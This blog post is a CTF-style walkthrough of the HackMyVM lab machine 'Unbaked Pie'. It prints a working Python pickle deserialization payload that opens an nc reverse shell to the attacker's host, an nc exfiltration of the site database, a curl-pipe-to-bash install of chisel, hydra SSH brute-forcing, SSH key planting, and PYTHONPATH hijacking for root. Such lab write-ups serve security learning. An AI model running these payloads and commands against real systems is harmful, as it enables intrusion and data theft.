---
layout: post
title: "HackMyVM - Unbaked Pie"
date: 2023-04-20 15:47:00 +0100
categories: hmv
tag: ["Python", "PortForward"]
---

Creator: [ch4rm](https://hackmyvm.eu/profile/?user=ch4rm)
Level: Hard
Release Date: 2020-10-06

## Scan 

* Open ports scan only, no timing or check

```
$ nmap -v --min-rate=1000 -p- -oN nmap.log -Pn 192.168.1.15
```

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 03:02 WEST
Initiating Parallel DNS resolution of 1 host. at 03:02
Completed Parallel DNS resolution of 1 host. at 03:02, 0.01s elapsed
Initiating Connect Scan at 03:02
Scanning 192.168.1.15 [65535 ports]
Connect Scan Timing: About 22.97% done; ETC: 03:04 (0:01:44 remaining)
Connect Scan Timing: About 45.86% done; ETC: 03:04 (0:01:12 remaining)
Connect Scan Timing: About 68.74% done; ETC: 03:04 (0:00:41 remaining)
Discovered open port 5003/tcp on 192.168.1.15
Completed Connect Scan at 03:04, 129.57s elapsed (65535 total ports)
Nmap scan report for 192.168.1.15
Host is up (0.00041s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
5003/tcp open  filemaker

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 129.70 seconds
```

* Scan open port

```
$ nmap -p 5003 -A -oN 5003.log -Pn 192.168.1.15
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 03:06 WEST
Nmap scan report for 192.168.1.15
Host is up (0.00082s latency).

PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 20 Apr 2023 02:06:14 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=BL3mFHveeZD4XWtFSI76ibxFQblcVEsiWiB2UkSgK0WKSYRz55Np1GrrZs48XkbG; expires=Thu, 18 Apr 2024 02:06:14 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 20 Apr 2023 02:06:14 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=4jf4mqtJHuuaJ0fOaTOlmKHnoWAsjnHXf7ioW9GvOOYu6aVNRptkrVwAriqJ9piL; expires=Thu, 18 Apr 2024 02:06:14 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5003-TCP:V=7.93%I=7%D=4/20%Time=64409E16%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1EC5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2020\x20Apr\x20
SF:2023\x2002:06:14\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\.
SF:6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x
SF:20DENY\r\nVary:\x20Cookie\r\nContent-Length:\x207453\r\nX-Content-Type-
SF:Options:\x20nosniff\r\nReferrer-Policy:\x20same-origin\r\nSet-Cookie:\x
SF:20\x20csrftoken=BL3mFHveeZD4XWtFSI76ibxFQblcVEsiWiB2UkSgK0WKSYRz55Np1Gr
SF:rZs48XkbG;\x20expires=Thu,\x2018\x20Apr\x202024\x2002:06:14\x20GMT;\x20
SF:Max-Age=31449600;\x20Path=/;\x20SameSite=Lax\r\n\r\n\n<!DOCTYPE\x20html
SF:>\n<html\x20lang=\"en\">\n\n<head>\n\n\x20\x20<meta\x20charset=\"utf-8\
SF:">\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,
SF:\x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20<meta\x20name=\"de
SF:scription\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x20conte
SF:nt=\"\">\n\n\x20\x20<title>\[Un\]baked\x20\|\x20/</title>\n\n\x20\x20<!
SF:--\x20Bootstrap\x20core\x20CSS\x20-->\n\x20\x20<link\x20href=\"/static/
SF:vendor/bootstrap/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\n\x
SF:20\x20<!--\x20Custom\x20fonts\x20for\x20this\x20template\x20-->\n\x20\x
SF:20<link\x20href=\"/static/vendor/fontawesome-free/css/all\.min\.cs")%r(
SF:HTTPOptions,1EC5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2020\x20Apr\
SF:x202023\x2002:06:14\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.
SF:8\.6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options
SF::\x20DENY\r\nVary:\x20Cookie\r\nContent-Length:\x207453\r\nX-Content-Ty
SF:pe-Options:\x20nosniff\r\nReferrer-Policy:\x20same-origin\r\nSet-Cookie
SF::\x20\x20csrftoken=4jf4mqtJHuuaJ0fOaTOlmKHnoWAsjnHXf7ioW9GvOOYu6aVNRptk
SF:rVwAriqJ9piL;\x20expires=Thu,\x2018\x20Apr\x202024\x2002:06:14\x20GMT;\
SF:x20Max-Age=31449600;\x20Path=/;\x20SameSite=Lax\r\n\r\n\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n\n<head>\n\n\x20\x20<meta\x20charset=\"utf
SF:-8\">\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20<meta\x20name=\
SF:"description\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x20co
SF:ntent=\"\">\n\n\x20\x20<title>\[Un\]baked\x20\|\x20/</title>\n\n\x20\x2
SF:0<!--\x20Bootstrap\x20core\x20CSS\x20-->\n\x20\x20<link\x20href=\"/stat
SF:ic/vendor/bootstrap/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\
SF:n\x20\x20<!--\x20Custom\x20fonts\x20for\x20this\x20template\x20-->\n\x2
SF:0\x20<link\x20href=\"/static/vendor/fontawesome-free/css/all\.min\.cs");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.10 seconds
```

## Python Webserver

* REQUEST: "hello" search

```http
POST /search HTTP/1.1
Host: 192.168.1.15:5003
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.15:5003/search
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://192.168.1.15:5003
Connection: close
Cookie: csrftoken=2oYhtcVJ6sNyxqRlYBMiQAGLLCROh5ahWpqe3EFMzC19BNLDM0We4E8UJr57hvuT; search_cookie="gASVBgAAAAAAAACMAmhplC4="
Upgrade-Insecure-Requests: 1

csrfmiddlewaretoken=Ui5YTHAWAM2P9529IkUY6gdHBhrvjLiJOjxVt9kZ3WgqdsWrwJ4UkkFQz6FOjbCl&query=hello

```

* RESPONSE

```http
HTTP/1.1 200 OK
Date: Thu, 20 Apr 2023 02:24:38 GMT
Server: WSGIServer/0.2 CPython/3.8.6
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 4881
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  search_cookie="gASVCQAAAAAAAACMBWhlbGxvlC4="; Path=/
Set-Cookie:  csrftoken=2oYhtcVJ6sNyxqRlYBMiQAGLLCROh5ahWpqe3EFMzC19BNLDM0We4E8UJr57hvuT; expires=Thu, 18 Apr 2024 02:24:38 GMT; Max-Age=31449600; Path=/; SameSite=Lax


<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">

  <title>[Un]baked | /search</title>

  <!-- Bootstrap core CSS -->
  <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

  <!-- Custom fonts for this template -->
  <link href="/static/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

  <!-- Custom styles for this template -->
  <link href="/static/css/clean-blog.min.css" rel="stylesheet">

</head>

<body>

  <!-- Navigation -->
  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
    <div class="container">
      <a class="navbar-brand" href="/">[Un]baked</a>
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
        Menu
        <i class="fas fa-bars"></i>
      </button>
      <div class="collapse navbar-collapse" id="navbarResponsive">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/about">About</a>
          </li>
          
          <div class="md-form mt-0">
            <form class="form-inline" method='post' action="/search">
              <input type="hidden" name="csrfmiddlewaretoken" value="tzSY3ANB32dLYZjB5wzvnUctJNPNWjIwnAkVD2xEwcrm2mdTTVJrBYECHC36WJ28">
              <input class="form-control mr-sm-2" name="query" type="search" placeholder="Search" aria-label="Search">
              <button class="btn btn-light my-2 my-sm-0" type="submit">Search</button>
            </form>
          </div>
          
          <li class="md-form mt-0 ml-2">
            <a class="btn button2 btn-outline-success my-2 my-sm-0" href="/accounts/login/">Login</a>
          </li>
          <li class="md-form mt-0 ml-2">
            <a class="btn btn-success my-2 my-sm-0" href="/accounts/signup/">Signup</a>
          </li>
          
        </ul>
      </div>
    </div>
  </nav>

  <!-- Page Header -->
  <header class="masthead" style="background-image: url('img/home-bg.jpg')">
    <div class="overlay"></div>
    <div class="container">
      <div class="row">
        <div class="col-lg-8 col-md-10 mx-auto">
          <div class="site-heading">
            <h1>[Un]baked:/search</h1>
            <span class="subheading">Share your recipes because why not?</span>
          </div>
        </div>
      </div>
    </div>
  </header>



<!-- Main Content -->
<div class="container">
    <div class="row">
      <div class="col-lg-8 col-md-10 mx-auto">
        
        <!-- Pager -->
        <div class="clearfix">
          <a class="btn btn-primary float-right" href="#">Older Posts &rarr;</a>
        </div>
      </div>
    </div>
  </div>

  <hr>



  <footer>
    <div class="container">
      <div class="row">
        <div class="col-lg-8 col-md-10 mx-auto">
          <ul class="list-inline text-center">
            <li class="list-inline-item">
              <a href="#">
                <span class="fa-stack fa-lg">
                  <i class="fas fa-circle fa-stack-2x"></i>
                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                </span>
              </a>
            </li>
            <li class="list-inline-item">
              <a href="#">
                <span class="fa-stack fa-lg">
                  <i class="fas fa-circle fa-stack-2x"></i>
                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
                </span>
              </a>
            </li>
            <li class="list-inline-item">
              <a href="#">
                <span class="fa-stack fa-lg">
                  <i class="fas fa-circle fa-stack-2x"></i>
                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                </span>
              </a>
            </li>
          </ul>
          <p class="copyright text-muted">Copyright &copy; Your Website 2020</p>
        </div>
      </div>
    </div>
  </footer>

  <!-- Bootstrap core JavaScript -->
  <script src="/static/vendor/jquery/jquery.min.js"></script>
  <script src="/static/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Custom scripts for this template -->
  <script src="/static/js/clean-blog.min.js"></script>

</body>

</html>


```

* Target: search_cookie

```http
search_cookie="gASVCQAAAAAAAACMBWhlbGxvlC4="
```

### Decode Search Cookie

#### CyberChef

<img src="https://drive.google.com/uc?id=1IGK4xie7zYMwbjEb4Y6B_t6syoOeTnTh"/>

```hex
\x80\x04\x95\x09\x00\x00\x00\x00\x00\x00\x00\x8c\x05\x68\x65\x6c\x6c\x6f\x94\x2e
```

## Pickle/Unpickle

```python
Python 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from base64 import b64decode
>>> hello = b64decode('gASVCQAAAAAAAACMBWhlbGxvlC4=')
>>> print(hello)
b'\x80\x04\x95\t\x00\x00\x00\x00\x00\x00\x00\x8c\x05hello\x94.'
>>> 
```

### Check if payload (hello) is serialized using `pickle`

```Python
>>> import pickle
>>> data = pickle.loads(hello)
>>> print(data)
hello
>>>
```

* True

## [Insecure Deserialization Attack](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

* Using `__reduce__` method

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.6 4444>/tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))

```

```bash
$ python exploit.py

b'gASVaAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE1ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjEuNiA0NDQ0Pi90bXAvZpSFlFKULg=='
```

### Request

<img src="https://drive.google.com/uc?id=1Uzi6ge_gIk6l5fTfyzHkgzTjUxGScqPu"/>

```http
POST /search HTTP/1.1
Host: 192.168.1.15:5003
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.15:5003/search
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://192.168.1.15:5003
Connection: close
Cookie: csrftoken=2oYhtcVJ6sNyxqRlYBMiQAGLLCROh5ahWpqe3EFMzC19BNLDM0We4E8UJr57hvuT; search_cookie=gASVaAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE1ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjEuNiA0NDQ0Pi90bXAvZpSFlFKULg==
Upgrade-Insecure-Requests: 1

csrfmiddlewaretoken=IFMrXs3ewkTBKknaXh8mdNIlvgf3G5qMCGeoxUNhZu7cOHhsLGiirRaut5tmGvKo&query=hello

```

### Reverse Shell (docker)

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.15] 60944
/bin/sh: 0: can't access tty; job control turned off

# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@8b39a559b296:/home#
```

### Download SQLite DB 

* Remove Host

```bash
root@8b39a559b296:/home# cd  site
cd site
root@8b39a559b296:/home/site# ls
ls
account  assets  bakery  db.sqlite3  homepage  manage.py  media  templates

root@8b39a559b296:/home/site# nc 192.168.1.6 9001 < db.sqlite3
nc 192.168.1.6 9001 < db.sqlite3
root@8b39a559b296:/home/site# 
```

* Local host

```bash
$ nc -nlvp 9001 > db.sqlite3
listening on [any] 9001 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.15] 48020
^C

$ ls
 db.sqlite3
```

### Database Users

```bash
$ sqlite3 db.sqlite3
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
auth_group                  django_admin_log          
auth_group_permissions      django_content_type       
auth_permission             django_migrations         
auth_user                   django_session            
auth_user_groups            homepage_article          
auth_user_user_permissions

sqlite> .headers on

sqlite> select * from auth_user LIMIT 1;
id|password|last_login|is_superuser|username|last_name|email|is_staff|is_active|date_joined|first_name
1|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=|2020-10-03 10:43:47.229292|1|aniqfakhrul|||1|1|2020-10-02 04:50:52.424582|

sqlite> select username, password from auth_user;
username|password
aniqfakhrul|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=
testing|pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=
ramsey|pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=
oliver|pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=
wan|pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=
sqlite> 
```

#### Rabbit Hole (decrypt Django hashes)

```bash
pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=
pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=
pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=
pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=
pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=
```

```bash
$ hashcat hash /usr/share/wordlists/rockyou.txt        
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-ivybridge-Intel(R) Core(TM) i3-3110M CPU @ 2.40GHz, 2850/5764 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10000 | Django (PBKDF2-SHA256) | Framework

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 5 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>

```

## Foothold (SSH user ramsey)

```bash
root@8b39a559b296:/# cd root
cd root
root@8b39a559b296:~# ls -la
ls -la
total 36
drwx------ 1 root root 4096 Oct  3  2020 .
drwxr-xr-x 1 root root 4096 Oct  3  2020 ..
-rw------- 1 root root  805 Oct  5  2020 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 Oct  3  2020 .cache
drwxr-xr-x 3 root root 4096 Oct  3  2020 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw------- 1 root root    0 Sep 24  2020 .python_history
drwx------ 2 root root 4096 Oct  3  2020 .ssh
-rw-r--r-- 1 root root  254 Oct  3  2020 .wget-hsts
root@8b39a559b296:~# cat .bash_history
cat .bash_history
nc
exit
ifconfig
ip addr
ssh 172.17.0.1
ssh 172.17.0.2
exit
ssh ramsey@172.17.0.1
exit
cd /tmp
wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh
chmod +x check-config.sh
./check-config.sh 
nano /etc/default/grub
vi /etc/default/grub
apt install vi
apt update
apt install vi
apt install vim
apt install nano
nano /etc/default/grub
grub-update
apt install grub-update
apt-get install --reinstall grub
grub-update
exit
ssh ramsey@172.17.0.1
exit
ssh ramsey@172.17.0.1
exit
ls
cd site/
ls
cd bakery/
ls
nano settings.py 
exit
ls
cd site/
ls
cd bakery/
nano settings.py 
exit
apt remove --purge ssh
ssh
apt remove --purge autoremove open-ssh*
apt remove --purge autoremove openssh=*
apt remove --purge autoremove openssh-*
ssh
apt autoremove openssh-client
clear
ssh
ssh
ssh
exit
root@8b39a559b296:~# 


```

### Local Network (docker)

```bash
root@8b39a559b296:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
root@8b39a559b296:~# 

```

#### Scan Docker Network

```bash
root@8b39a559b296:~# nc -znv 172.17.0.1 22
nc -znv 172.17.0.1 22
(UNKNOWN) [172.17.0.1] 22 (ssh) open
root@8b39a559b296:~# 
```

```bash
root@8b39a559b296:~# nc -znv 172.17.0.1 1-65535    
nc -znv 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 5003 (?) open
(UNKNOWN) [172.17.0.1] 22 (ssh) open
root@8b39a559b296:~#

```

#### Port Forward

```bash
root@8b39a559b296:/tmp# curl https://i.jpillora.com/chisel! | bash
curl https://i.jpillora.com/chisel! | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5106    0  5106    0     0   6918      0 --:--:-- --:--:-- --:--:--  6918
Installing jpillora/chisel v1.8.1 (linux/amd64).....
######################################################################## 100.0%
Installed at /usr/local/bin/chisel
root@8b39a559b296:/tmp# 
```

* Remote

```bash
root@8b39a559b296:/tmp# chisel client 192.168.1.6:2022 R:2023:172.17.0.1:22
chisel client 192.168.1.6:2022 R:2023:172.17.0.1:22
```

* Local

```bash
$ ./chisel server -p 2022 --reverse
2023/04/20 06:43:03 server: Reverse tunnelling enabled
2023/04/20 06:43:03 server: Fingerprint Apyi7sVRblJPqzXcbkhXN5QztCf7/vZZPqEFh1xqzwI=
2023/04/20 06:43:03 server: Listening on http://0.0.0.0:2022
2023/04/20 06:43:44 server: session#1: tun: proxy#R:2023=>172.17.0.1:22: Listening
```

* Check Connection

```bash
$ ss -tnlp
State           Recv-Q          Send-Q                   Local Address:Port                    Peer Address:Port         Process                                       
LISTEN          0               511                          127.0.0.1:6463                         0.0.0.0:*             users:(("Discord",pid=12792,fd=163))         
LISTEN          0               5                              0.0.0.0:902                          0.0.0.0:*                                                          
LISTEN          0               4096                         127.0.0.1:33589                        0.0.0.0:*                                                          
LISTEN          0               5                                 [::]:902                             [::]:*                                                          
LISTEN          0               4096                                 *:2023                               *:*             users:(("chisel",pid=16177,fd=8))            
LISTEN          0               4096                                 *:2022                               *:*             users:(("chisel",pid=16177,fd=6))

```

## Cracking SSH user (ramsey)

```bash
$ hydra -t4 -l ramsey -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:2023
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-20 06:53:06
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://127.0.0.1:2023/
[2023][ssh] host: 127.0.0.1   login: ramsey   password: 12345678
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-20 06:53:12
```

## Lateral Movement (ramsey > oliver)

```bash
$ ssh ramsey@127.0.0.1 -p 2023
Last login: Sat Oct  3 22:15:57 2020 from 172.17.0.2
ramsey@unbaked:~$ 
```

### Priviledge Escalation

```bash
ramsey@unbaked:~$ sudo -l
[sudo] password for ramsey: 
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
```

### Copy ID_RSA.pub + Modify vuln.py

```bash
ramsey@unbaked:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCaEiPBtYq9..." > authorized_keys
ramsey@unbaked:~$ rm vuln.py 
rm: remove write-protected regular file 'vuln.py'? y
```

* Modify vuln.py

```
import os

os.system('mkdir /home/oliver/.ssh')
os.system('cp /home/ramsey/authorized_keys /home/oliver/.ssh/authorized_keys')
```

* Execute vuln.py as oliver

```bash
ramsey@unbaked:~$ sudo -u oliver python /home/ramsey/vuln.py
```

## ROOT (oliver > root)

```bash
$ ssh oliver@127.0.0.1 -p 2023
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

oliver@unbaked:~$ id
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)

oliver@unbaked:~$ sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
oliver@unbaked:~$ 
```

```bash
oliver@unbaked:~$ cat /opt/dockerScript.py 
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
oliver@unbaked:~$
```

* Modify docker.py

```python
import os
os.system("/bin/bash -i")
```

```bash
oliver@unbaked:~$ sudo PYTHONPATH=/tmp python /opt/dockerScript.py
root@unbaked:~# id
uid=0(root) gid=0(root) groups=0(root)
root@unbaked:~#
```
